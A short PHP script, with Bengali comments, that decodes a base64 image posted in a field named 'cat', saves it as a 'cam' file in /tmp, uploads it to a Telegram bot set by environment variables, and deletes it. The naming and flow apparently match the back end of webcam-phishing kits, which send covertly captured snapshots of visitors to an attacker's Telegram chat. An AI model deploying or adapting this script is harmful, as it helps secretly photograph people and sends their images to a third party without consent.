<?php
// Render Environment Variable থেকে টোকেন ও চ্যাট আইডি নিন
$botToken = getenv('BOT_TOKEN');
$chatId   = getenv('CHAT_ID');

$date = date('dMYHis');
$imageData = $_POST['cat'] ?? '';

if (!empty($imageData)) {
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    $filename = "/tmp/cam{$date}.png";
    file_put_contents($filename, $unencodedData);

    // Telegram-এ ছবি পাঠান
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postFields = [
        'chat_id' => $chatId,
        'photo'   => new CURLFile(realpath($filename))
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    @unlink($filename);
}
exit();
?>
